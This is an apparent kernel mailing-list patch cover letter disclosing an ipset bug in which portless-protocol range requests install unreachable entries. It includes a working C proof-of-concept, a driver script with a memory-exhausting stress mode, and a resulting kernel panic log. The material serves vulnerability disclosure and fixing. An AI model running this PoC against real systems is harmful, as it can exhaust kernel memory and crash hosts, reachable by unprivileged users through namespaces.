Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.48
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792609794;
	b=4jR+kaGa+rxDrETZonLYoJNYPw5xo08rblbYSf2JUexMHDz4z61rwX3INQBVGEOQwLPL
	 4ZdS6GzG02eXWFD1HrpKCvqlLYLCi0Z1ddV3dbhalyjdYUap0m4OtSbEJ0UHM6qZp5ULB
	 h0dxebKUkxVKYgzp6fgDxE6yQyxUgoBGGEpiaL1EWrn+/Ngd+UVKGr4VJCj+8Lg2xlz5z
	 UBiQqZq95tZ07aLqf612KDzL6OVypB1zT7AnkYzJe9Ri1aCzvDUACSMYv2yzdH6SUO1qX
	 z9N/7sXpxj088CYptaCLkDkuEyy+FU4z4XU376GhyU8WxFIIfUYf2grjPV/Y62t6YzA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792609794;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=KRb5l4iUhxnnmxi9MfZacJ4ccaXUzhilSWVTF4lpJBo=;
	b=YYHOvrSogVYkzs80ZVqKLxOB6Ol2khuN6Kzo47EbFsYgo0P1v8awz2eQKYvLYXDUJxqp
	 K/2K5TvPVzLs06gzlhjF++9U9qmLOTvbOAvnQZMwp0oTzQ1qeUslS2pRbTaVKHE/pU7V3
	 NxsFMSGiZFqmj4bj827OEuJ6+D9mcy2iZpPLbxklqEW4uS1ZDU5XHUaGUTA36PaQUh/WQ
	 Q0Y3yUwZOtOUNXq0BqnaTUlzC69KMe/hMj3mh5MJlfOe0kxpX3ZDOQ9O1dfPtPAnTAMtd
	 mNjHPUcb4djNCb/ihNwAzjQzpr6boKY+Hy28b0my6OeFbNlIC2P0fn1IM71PcvoHk1w==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=jcDP9gKW;
	arc=none smtp.remote-ip=209.85.216.48
Received: from mail-pj1-f48.google.com (mail-pj1-f48.google.com [209.85.216.48])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6F595606A331
	for <netfilter-devel@vger.kernel.org>; Wed, 21 Oct 2026 19:09:54 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 6F595606A331
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=jcDP9gKW
Received: by mail-pj1-f48.google.com with SMTP id 98e67ed59e1d1-3ab41538192so827703a91.0
        for <netfilter-devel@vger.kernel.org>; Wed, 21 Oct 2026 12:09:54 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792609794; x=1793214594; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=KRb5l4iUhxnnmxi9MfZacJ4ccaXUzhilSWVTF4lpJBo=;
        b=jcDP9gKWcLJMUJ1mwOYPfaqsQgR7L283Tit30zuEqeJF7mRgRo8No38F7cZqQaCOdY
         +jtkQs7uhlfaUh3bNsXSjRMVnnfD6xjt3PCmxSJ1wDiCo6xLrvlc1FBGQbXobnaWIulE
         oKiCdsoGGXU6dbE1Qm4fPy8PxqWNHDYNUdqIMppUt8s155MfOJP0LI3uJ0lzwPlNKv1v
         Pgo8+bWh1MEqp7rXDMgHVXf83LK9WdG/I+OHVGBLSHMKqwamIyyFcw691wPJypuM8q8C
         8nuyNgnPiUT/eaz+RNHbuR09yUvbWzQ6qknvGohaaiBHJ2pvi4/rX2P/93aTzJpjcIWb
         /QcQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792609794; x=1793214594;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=KRb5l4iUhxnnmxi9MfZacJ4ccaXUzhilSWVTF4lpJBo=;
        b=xLU/Ze5R2envSRXwIPCEcqaUpxM+uDzBQlQQ/C7c9Zsqxz2EvcsaSO7Ag/5FLhi/eJ
         1fCPYfff217P/qcoshJqrquCDRraPlWPM4WjWfGb3+4MBa3KBwpvBVlUfiuFcksVsEhy
         jgQwU69tOo8DER6eMMT4iD8XsFYEhZOHQgQ99/7g35YVaRh8u0NE1M+gavuHVNwk4sMK
         Kjh+1S7qNHEEUYCjVF4kqoKTyJNq+k+6XbqImlIgui5BeSiKzLEELJCVvBTOP7kX0a9e
         hkHDPm7n6OLc7wy5ofCEvt2tI2tKm3dDJulWzswfVSCeYpK/+VoD0k200Dc5GrUa1Emp
         61MQ==
X-Gm-Message-State: AFq9FYJ8tX0jToeiiq9tJeyHrOlrBiMbZgngVNBoXZgRPwjcds2kW4qp
	uuhZKo5hpMUoIARLxKnkVyiKD8eu0hqi3zOTHNYREf51a8YQ6ia+3WTaQQQYC+Mx7UdsRFElvbi
	qxSzWVA==
X-Gm-Gg: AYBFou3tkomngGryqgSN1mi4IKK+OCdzA5MBrGyeKa+EpDXIDbHZqBkHxrJBrLUUeUC
	Xz4Qqr10Ol6/RZzKIPm+Lin/+bvEcfhHGwtaxS7J2zYv+zNdmhjfzGuTJcdcaLAgrsaOKYPuWv8
	mWRV8FcBWP5UGlLeG/Ioch47WjuyP5CUL8APYUhx1sKsEFmE0QKuYN/auijUtlgHiJ6KGySqrqU
	aJe2mPF+0+sxjJloO1uHo++9JcV8+wCvWNlGgoNwyinT0LoBJtGABCK2Ro8fRzuzx5h9vYTimDg
	koO6LlAG68vj/fg/iQd3y8xE9RPtbep1d7aYL3MeGaJHlT7PZ7fHf4y1zwoKHEf53mHWod654UO
	2zU0L5qzpGUJSdg9QkDUwEWugFSGriOoqhCB1Cm/35Qrzn7rA8XNit3pEicMy3Ni1RhzTAAnzgK
	b3YMWIlwN1rfCpg1DMIv8mVk/e3meF4ENaDY/rLIFHV3u22G/yFsSFLeLc6bsl8v1RXv9ZKDmb/
	AW6zzd59xi3coZs7rncBPQ/rWc1mgtgZNZOzcSq59FFB5L5k7S99SFZMu5zfAMqJvt2vEk=
X-Received: by 2002:a17:90b:4c49:b0:3ac:9c37:9430 with SMTP id 98e67ed59e1d1-3ad86f1be02mr2574638a91.21.1792609793537;
        Wed, 21 Oct 2026 12:09:53 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.58])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ada48ed719sm706599a91.5.2026.10.21.12.09.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 21 Oct 2026 12:09:53 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	kadlec@netfilter.org,
	zhilinz@nebusec.ai,
	oliver@8.c.9.b.0.7.4.0.1.0.0.2.ip6.arpa,
	vega@nebusec.ai
Subject: [PATCH nf 0/1] ipset: ignore port ranges for portless protocols
Date: Thu, 22 Oct 2026 03:09:41 +0800
Message-ID: <cover.1792609477.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Post: <mailto:netfilter-devel@vger.kernel.org>
List-Help: <mailto:netfilter-devel+help@vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netfilter-devel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in
net/netfilter/ipset/ip_set_hash_netportnet.c. The bug is reachable by a
non-root user via user and network namespaces.

This bug is tracked at: https://bugtracker.nebusec.ai/f/12359

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

hash_netportnet4_uadt() canonicalizes the port to zero for protocols
without ports and clears with_ports. However, when an IP range is
present, the range path still reads IPSET_ATTR_PORT_TO and iterates the
specified port range. For a portless protocol such as GRE, a single
range request can therefore install nonzero-port keys that packet-side
matching never creates. These unreachable entries consume maxelem; with
forceadd, they can also evict effective entries and leave the set's
policy incomplete.

The IPv4 range path should only expand the port dimension when
with_ports is set. Address ranges still expand with the canonical zero
port. The IPv6 handler already avoids port-range expansion when the
protocol does not support ports.

Reproducer:

    ./poc.sh prove
    ./poc.sh stress 100

For the namespace proof, run as test_user:

    PATH=/usr/sbin:/usr/bin:/sbin:/bin \
    unshare -Urn sh -c '
      /usr/sbin/ipset create u hash:net,port,net family inet maxelem 4
      /home/test_user/poc prove u
      /usr/sbin/ipset list u -o save
    '

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
The stress mode is run as root because it sets vm.panic_on_oom=2.

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    SETNAME=${SETNAME:-h6m}
    MODE=${1:-prove}

    cd "$DIR"
    make

    case "$MODE" in
    prove)
    	ipset destroy "$SETNAME" 2>/dev/null || true
    	ipset create "$SETNAME" hash:net,port,net family inet maxelem 4
    	./poc prove "$SETNAME"
    	ipset list "$SETNAME" -o save
    	;;
    stress)
    	ipset destroy "$SETNAME" 2>/dev/null || true
    	sysctl -w vm.panic_on_oom=2
    	ipset create "$SETNAME" hash:net,port,net family inet maxelem 20000000 comment counters skbinfo
    	./poc stress "$SETNAME" "${2:-4096}"
    	;;
    *)
    	echo "usage: $0 [prove|stress [loops]]" >&2
    	exit 2
    	;;
    esac

------END poc.sh------

------BEGIN poc.c------

    #define _GNU_SOURCE

    #include <arpa/inet.h>
    #include <errno.h>
    #include <linux/netfilter/nfnetlink.h>
    #include <linux/netlink.h>
    #include <netinet/in.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <unistd.h>

    #ifndef NETLINK_NETFILTER
    #define NETLINK_NETFILTER 12
    #endif

    #ifndef NFNL_SUBSYS_IPSET
    #define NFNL_SUBSYS_IPSET 6
    #endif

    #define IPSET_PROTOCOL 7
    #define IPSET_CMD_ADD 9

    #define IPSET_ATTR_PROTOCOL 1
    #define IPSET_ATTR_SETNAME 2
    #define IPSET_ATTR_DATA 7

    #define IPSET_ATTR_IP 1
    #define IPSET_ATTR_IP_TO 2
    #define IPSET_ATTR_PORT 4
    #define IPSET_ATTR_PORT_TO 5
    #define IPSET_ATTR_PROTO 7
    #define IPSET_ATTR_IP2 20
    #define IPSET_ATTR_COMMENT 26

    #define IPSET_ATTR_IPADDR_IPV4 1

    #define MAX_MSG 4096
    #define GRE_PROTO 47
    #define PROVE_PORT_END 3
    #define STRESS_PORT_END 16383

    struct request {
    	struct nlmsghdr nlh;
    	struct nfgenmsg nfg;
    	char buf[MAX_MSG];
    };

    static void die(const char *msg)
    {
    	perror(msg);
    	exit(1);
    }

    static void diex(const char *msg)
    {
    	fprintf(stderr, "%s\n", msg);
    	exit(1);
    }

    static size_t attr_total(size_t payload_len)
    {
    	return NLA_ALIGN(NLA_HDRLEN + payload_len);
    }

    static struct nlattr *nla_put_raw(struct nlmsghdr *nlh, size_t maxlen,
    				  uint16_t type, const void *data,
    				  size_t payload_len)
    {
    	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
    	size_t total = attr_total(payload_len);
    	struct nlattr *nla;

    	if (off + total > maxlen)
    		diex("netlink message too large");

    	nla = (struct nlattr *)((char *)nlh + off);
    	nla->nla_type = type;
    	nla->nla_len = NLA_HDRLEN + payload_len;
    	if (payload_len && data)
    		memcpy((char *)nla + NLA_HDRLEN, data, payload_len);
    	if (total > nla->nla_len)
    		memset((char *)nla + nla->nla_len, 0, total - nla->nla_len);

    	nlh->nlmsg_len = off + total;
    	return nla;
    }

    static struct nlattr *nla_nest_start(struct nlmsghdr *nlh, size_t maxlen,
    				     uint16_t type)
    {
    	return nla_put_raw(nlh, maxlen, type | NLA_F_NESTED, NULL, 0);
    }

    static void nla_nest_end(struct nlmsghdr *nlh, struct nlattr *start)
    {
    	start->nla_len = (char *)nlh + nlh->nlmsg_len - (char *)start;
    }

    static void nla_put_u8(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
    		       uint8_t value)
    {
    	nla_put_raw(nlh, maxlen, type, &value, sizeof(value));
    }

    static void nla_put_be16(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
    			 uint16_t value)
    {
    	uint16_t be = htons(value);

    	nla_put_raw(nlh, maxlen, type | NLA_F_NET_BYTEORDER, &be, sizeof(be));
    }

    static void nla_put_string(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
    			   const char *value)
    {
    	nla_put_raw(nlh, maxlen, type, value, strlen(value) + 1);
    }

    static void nla_put_ipv4(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
    			 uint32_t be_addr)
    {
    	struct nlattr *nest = nla_nest_start(nlh, maxlen, type);

    	nla_put_raw(nlh, maxlen,
    		    IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER,
    		    &be_addr, sizeof(be_addr));
    	nla_nest_end(nlh, nest);
    }

    static int recv_ack(int fd, uint32_t seq)
    {
    	char buf[8192];
    	struct iovec iov = {
    		.iov_base = buf,
    		.iov_len = sizeof(buf),
    	};
    	struct sockaddr_nl addr;
    	struct msghdr msg = {
    		.msg_name = &addr,
    		.msg_namelen = sizeof(addr),
    		.msg_iov = &iov,
    		.msg_iovlen = 1,
    	};
    	struct nlmsghdr *nlh;

    	for (;;) {
    		ssize_t len = recvmsg(fd, &msg, 0);

    		if (len < 0) {
    			if (errno == EINTR)
    				continue;
    			die("recvmsg");
    		}

    		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
    		     nlh = NLMSG_NEXT(nlh, len)) {
    			struct nlmsgerr *err;

    			if (nlh->nlmsg_seq != seq)
    				continue;
    			if (nlh->nlmsg_type == NLMSG_ERROR) {
    				err = (struct nlmsgerr *)NLMSG_DATA(nlh);
    				return err->error;
    			}
    		}
    	}
    }

    static int send_bad_add(int fd, uint32_t seq, const char *setname,
    			uint32_t ip, uint32_t ip2, uint16_t port_end,
    			const char *comment)
    {
    	struct request req;
    	struct sockaddr_nl addr = {
    		.nl_family = AF_NETLINK,
    	};
    	struct iovec iov = {
    		.iov_base = &req,
    		.iov_len = 0,
    	};
    	struct msghdr msg = {
    		.msg_name = &addr,
    		.msg_namelen = sizeof(addr),
    		.msg_iov = &iov,
    		.msg_iovlen = 1,
    	};
    	struct nlattr *data;

    	memset(&req, 0, sizeof(req));
    	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.nfg));
    	req.nlh.nlmsg_type = (NFNL_SUBSYS_IPSET << 8) | IPSET_CMD_ADD;
    	req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    	req.nlh.nlmsg_seq = seq;
    	req.nfg.nfgen_family = AF_INET;
    	req.nfg.version = NFNETLINK_V0;
    	req.nfg.res_id = htons(0);

    	nla_put_u8(&req.nlh, sizeof(req), IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);
    	nla_put_string(&req.nlh, sizeof(req), IPSET_ATTR_SETNAME, setname);

    	data = nla_nest_start(&req.nlh, sizeof(req), IPSET_ATTR_DATA);
    	nla_put_ipv4(&req.nlh, sizeof(req), IPSET_ATTR_IP, ip);
    	nla_put_ipv4(&req.nlh, sizeof(req), IPSET_ATTR_IP_TO, ip);
    	nla_put_be16(&req.nlh, sizeof(req), IPSET_ATTR_PORT, 0);
    	nla_put_be16(&req.nlh, sizeof(req), IPSET_ATTR_PORT_TO, port_end);
    	nla_put_u8(&req.nlh, sizeof(req), IPSET_ATTR_PROTO, GRE_PROTO);
    	nla_put_ipv4(&req.nlh, sizeof(req), IPSET_ATTR_IP2, ip2);
    	if (comment)
    		nla_put_string(&req.nlh, sizeof(req), IPSET_ATTR_COMMENT,
    			       comment);
    	nla_nest_end(&req.nlh, data);

    	iov.iov_len = req.nlh.nlmsg_len;
    	if (sendmsg(fd, &msg, 0) < 0)
    		die("sendmsg");

    	return recv_ack(fd, seq);
    }

    static uint32_t nth_ipv4(uint32_t base_host, unsigned int index)
    {
    	return htonl(base_host + index);
    }

    static void usage(const char *prog)
    {
    	fprintf(stderr,
    		"Usage:\n"
    		"  %s prove <setname>\n"
    		"  %s stress <setname> [loops]\n",
    		prog, prog);
    	exit(2);
    }

    int main(int argc, char **argv)
    {
    	static char comment[255];
    	const char *mode;
    	const char *setname;
    	unsigned int loops = 0;
    	unsigned int i;
    	uint32_t seq = 1;
    	int fd, ret;
    	struct sockaddr_nl local = {
    		.nl_family = AF_NETLINK,
    	};

    	if (argc < 3)
    		usage(argv[0]);

    	mode = argv[1];
    	setname = argv[2];

    	memset(comment, 'A', sizeof(comment) - 1);
    	comment[sizeof(comment) - 1] = '\0';

    	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    	if (fd < 0)
    		die("socket");
    	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0)
    		die("bind");

    	if (strcmp(mode, "prove") == 0) {
    		ret = send_bad_add(fd, seq++, setname,
    				   inet_addr("192.0.2.1"),
    				   inet_addr("198.51.100.1"),
    				   PROVE_PORT_END, NULL);
    		printf("prove returned %d\n", ret);
    		close(fd);
    		return ret == 0 ? 0 : 1;
    	}

    	if (strcmp(mode, "stress") != 0)
    		usage(argv[0]);

    	loops = argc >= 4 ? (unsigned int)strtoul(argv[3], NULL, 0) : 0;
    	if (loops == 0)
    		loops = 4096;

    	for (i = 0; i < loops; i++) {
    		uint32_t ip = nth_ipv4(0xc6120001U, i);
    		uint32_t ip2 = nth_ipv4(0xc6330001U, i);

    		ret = send_bad_add(fd, seq++, setname, ip, ip2, STRESS_PORT_END,
    				   comment);
    		if (ret != 0) {
    			fprintf(stderr,
    				"stress stopped at loop=%u expected_entries=%u ret=%d\n",
    				i, i * (STRESS_PORT_END + 1), ret);
    			close(fd);
    			return 1;
    		}
    		if ((i % 10) == 0) {
    			printf("loop=%u expected_entries=%u\n",
    			       i + 1, (i + 1) * (STRESS_PORT_END + 1));
    			fflush(stdout);
    		}
    	}

    	close(fd);
    	return 0;
    }

------END poc.c------

------BEGIN Makefile------

    CC ?= gcc
    CFLAGS ?= -O2 -Wall -Wextra

    all: poc

    poc: poc.c
    	$(CC) $(CFLAGS) -o $@ $<

    clean:
    	rm -f poc

------END Makefile------

----BEGIN crash log----

[ 1228.171565][T11210] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[ 1228.172471][T11210] CPU: 3 UID: 0 PID: 11210 Comm: poc Not tainted 6.12.95 #2
[ 1228.173111][T11210] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1228.174082][T11210] Call Trace:
[ 1228.174314][T11210]  <TASK>
[ 1228.174562][T11210]  panic+0x533/0x610
[ 1228.174894][T11210]  ? dump_header+0x5d2/0x800
[ 1228.175285][T11210]  ? __pfx_panic+0x10/0x10
[ 1228.175652][T11210]  out_of_memory+0x73c/0x1430
[ 1228.176048][T11210]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 1228.176498][T11210]  ? __pfx_out_of_memory+0x10/0x10
[ 1228.176922][T11210]  ? lock_acquire+0x2f/0xb0
[ 1228.177297][T11210]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 1228.177761][T11210]  __alloc_pages_noprof+0x1ecc/0x26d0
[ 1228.178220][T11210]  ? hlock_class+0x4e/0x130
[ 1228.178603][T11210]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1228.179072][T11210]  ? __lock_acquire+0xc96/0x3c40
[ 1228.179477][T11210]  ? __pfx___alloc_pages_noprof+0x10/0x10
[ 1228.180016][T11210]  ? __pfx___lock_acquire+0x10/0x10
[ 1228.180480][T11210]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1228.180887][T11210]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1228.181283][T11210]  ? find_held_lock+0x2d/0x110
[ 1228.181656][T11210]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[ 1228.182050][T11210]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[ 1228.182493][T11210]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1228.182904][T11210]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1228.183290][T11210]  ? xas_load+0x1e2/0x410
[ 1228.183606][T11210]  ? filemap_get_entry+0xbd/0x2c0
[ 1228.183987][T11210]  folio_alloc_noprof+0x16/0x90
[ 1228.184343][T11210]  filemap_alloc_folio_noprof+0x279/0x320
[ 1228.184766][T11210]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10
[ 1228.185204][T11210]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1228.185609][T11210]  __filemap_get_folio+0x35b/0x7a0
[ 1228.185995][T11210]  filemap_fault+0x10db/0x1fe0
[ 1228.186341][T11210]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1228.186740][T11210]  ? __pfx_filemap_fault+0x10/0x10
[ 1228.187112][T11210]  ? __pfx_lock_release+0x10/0x10
[ 1228.187489][T11210]  __do_fault+0xed/0x3a0
[ 1228.187806][T11210]  do_pte_missing+0x10c9/0x3710
[ 1228.188159][T11210]  ? pte_offset_map_nolock+0x7a/0x170
[ 1228.188571][T11210]  __handle_mm_fault+0xac8/0x1db0
[ 1228.188940][T11210]  ? __pfx_lock_release+0x10/0x10
[ 1228.189307][T11210]  ? down_read_trylock+0x1f0/0x3f0
[ 1228.189675][T11210]  ? lock_vma_under_rcu+0x121/0x720
[ 1228.190044][T11210]  ? __pfx___handle_mm_fault+0x10/0x10
[ 1228.190484][T11210]  handle_mm_fault+0x2ad/0x910
[ 1228.190872][T11210]  do_user_addr_fault+0x301/0xe10
[ 1228.191252][T11210]  exc_page_fault+0x5d/0xe0
[ 1228.191577][T11210]  asm_exc_page_fault+0x26/0x30
[ 1228.191930][T11210] RIP: 0033:0x7f53a5e77120
[ 1228.192245][T11210] Code: 49 01 d0 49 89 d1 48 8b 43 68 89 f5 48 8d 4c 6d 00 48 8b 78 08 48 8b 83 f8 00 00 00 48 8b 40 08 4c 01 cf 4c 8d 24 c8 4d 01 cc <49> 8b 74 24 08 4d 8b 2c 24 48 89 f0 49 01 d5 48 c1 e8 20 48 8d 0c
[ 1228.193557][T11210] RSP: 002b:00007fff1e324a40 EFLAGS: 00010206
[ 1228.193978][T11210] RAX: 00005560447dd8e0 RBX: 00007f53a5e9d5f0 RCX: 000000000000001b
[ 1228.194497][T11210] RDX: 00005560447dd000 RSI: 0000000000000009 RDI: 00005560447dd638
[ 1228.195026][T11210] RBP: 0000000000000009 R08: 00005560447dd3e0 R09: 0000000000000000
[ 1228.195551][T11210] R10: 0000000000000000 R11: 0000000000000202 R12: 00005560447dd9b8
[ 1228.196078][T11210] R13: 00005560447e10e0 R14: 000000000000004b R15: 0000000000000001
[ 1228.196656][T11210]  </TASK>
[ 1228.197246][T11210] Kernel Offset: disabled
[ 1228.197645][T11210] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipset: ignore port ranges for portless protocols

 net/netfilter/ipset/ip_set_hash_netportnet.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

